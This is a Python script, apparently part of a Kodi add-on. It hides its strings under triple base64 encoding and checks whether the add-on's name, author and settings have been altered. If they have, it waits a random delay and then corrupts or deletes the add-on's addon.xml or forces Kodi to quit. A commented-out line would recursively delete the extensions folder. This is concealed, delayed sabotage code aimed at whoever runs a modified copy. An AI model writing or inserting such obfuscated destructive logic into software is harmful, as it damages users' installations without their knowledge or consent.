import time, os, sys, random

if __name__== '__main__':

	def _d(data):
		try:
			type = 'ba' + 'se' + str((70 - 6))
			data = data.decode(type)
			data = data.decode(type)
			data = data.decode(type)
			return data[:-1]
		except:
			return ''

	pc = os.path.dirname(os.path.realpath(__file__))
	pr = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir)), os.pardir)), os.pardir))
	px = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir)), os.pardir))
	pl = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir))
	pe = os.path.join(pl, _d('V2xob01GcFhOWHBoVnpsMVkzbEJQUT09'))
	pa = os.path.join(pr, _d('V1ZkU2EySXlOSFZsUnpGelNVRTlQUT09'))
	ps = os.path.join(px, _d('WXpKV01HUkhiSFZhTTAxMVpVY3hjMGxCUFQwPQ=='))

	def __kixe__(x):
		import xbmc
		xbmc.executebuiltin(x)

	def __kiai__(x, y):
		import xbmcaddon
		return xbmcaddon.Addon(x).getAddonInfo(y)

	def __kias__(dd, x, y):
		try:
			zi = dd.find(y)
			if zi < 0: return ''
			ze = dd.find('/>', zi)
			if ze < 0: return ''
			dd = dd[zi : ze]
			zi = dd.find(_d('V2tkV2JWbFlWbk5rUTBFOQ=='))
			if zi < 0: return ''
			zi = dd.find('"', zi) + 1
			ze = dd.find('"', zi)
			return dd[zi : ze]
		except:
			return ''

	def _f():
		w = random.randint(300, 600)
		time.sleep(w)

		if random.randint(0, 3) == 0:
			try:
				f = open(pa, 'r')
				d = f.read().replace(_d('V0VjMFp3PT0='), _d('VUd4NGRVbEJQVDA9'), 1)
				f.close()
				f = open(pa, 'w')
				f.write(d)
				f.close()
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				#import shutil
				#shutil.rmtree(pe)
				os.chmod(pa, stat.S_IWRITE)
				os.remove(pa)
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				__kixe__(_d('VlZoV2NHUkRRVDA9'))
			except:
				pass

	try:
		f = open(pa, 'r')
		d = f.read()
		f.close()

		s = d.find(_d('VUVkR2ExcEhPWFZKUjJ4clVGTkpadz09')) + 11
		e = d.find('"', s)
		ai = d[s : e]

		an = __kiai__(ai, _d('WW0xR2RGcFRRVDA9'))
		aa = __kiai__(ai, _d('V1ZoV01HRkhPWGxKUVQwOQ=='))
		ab = _d('VVc1V2FWbHRlR3hqZVVFOQ==')
		al = _d('WWpKYWJXTXlhSFpqYlZadVlWaFJkVmt5T1hSTU1rb3hXVzFLYzFwWVRXYz0=')

		if not an == ab or not aa == ab:
			_f()
		else:
			dd = None
			with open(ps, 'r') as file:
				dd = file.read()
			if not al in __kias__(dd, ai, _d('WWtkc2RXRjVOWGRqYlZaMFlWaFdkR0ZZY0d4SlFUMDk=')):
				_f()
			elif not al in __kias__(dd, ai, _d('WWtkc2RXRjVOWGxhVjBaeldrZFdhV050Ykd0SlFUMDk=')):
				_f()
			elif not al in __kias__(dd, ai, _d('WWtkc2RXRjVOV3haV0U0MVltMVdNMk41UVQwPQ==')):
				_f()
	except:
		#_f()
		pass
